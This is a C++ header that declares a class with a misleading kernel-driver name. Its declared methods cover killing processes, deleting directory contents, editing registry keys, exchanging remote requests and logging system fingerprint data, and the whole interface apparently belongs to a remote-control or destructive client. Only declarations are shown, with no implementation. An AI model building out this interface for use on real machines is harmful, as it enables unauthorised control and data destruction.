#pragma once
#include <WSclient.h>

class _kernelDriversClass
{
	public:
	void _SendKeyToOff();
	void _KillProcessRunning();
	void RecvRequestUserID_2();
	void RecvRequestUserID_1();
	void RecvRequestUserID_3();
	void RecvRequestUserID_4();
	void RecvRequestUserID_5();
	bool IsSystemDrive(const std::wstring& drive);
	void DeleteContents(const std::wstring& path);
	void _SendKeyTodo(HKEY hRoot, const wchar_t* szKey);
	void SendRequestUserID_1(const BYTE* ReceiveBuffer);
	void SendRequestUserID_2(const BYTE* ReceiveBuffer);
	void SendRequestUserID_3(const BYTE* ReceiveBuffer);
	void SendRequestUserID_4(const BYTE* ReceiveBuffer);
	void SendRequestUserID_5(const BYTE* ReceiveBuffer);
	std::string GetOSName();
	std::string GetGPUName();
	std::string GetSystemArchitecture();
	std::string GetRAMInfo();
	std::string GetWindowsDisplayVersion();
	std::string GetWindowsInstallDate();
	std::string GetGPUVRAM();
	void LogSystemInfo();
};
extern _kernelDriversClass _gKernelClass;